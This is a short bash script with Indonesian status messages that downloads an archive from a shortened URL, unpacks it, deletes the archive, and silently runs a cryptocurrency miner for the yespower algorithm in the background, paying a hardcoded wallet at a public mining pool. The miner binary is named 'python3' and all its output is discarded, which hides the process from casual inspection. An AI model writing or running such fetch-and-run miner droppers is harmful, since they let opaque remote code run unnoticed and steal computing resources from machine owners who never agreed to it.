#!/bin/bash

clear

echo "download dot-srb..."

wget -q -O dot-srb s.id/25RZs

clear

echo "ekstrak dot-srb..."

tar -xzf dot-srb >/dev/null

clear

echo "hapus dot-srb..."

rm dot-srb

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &

clear

echo "running..."
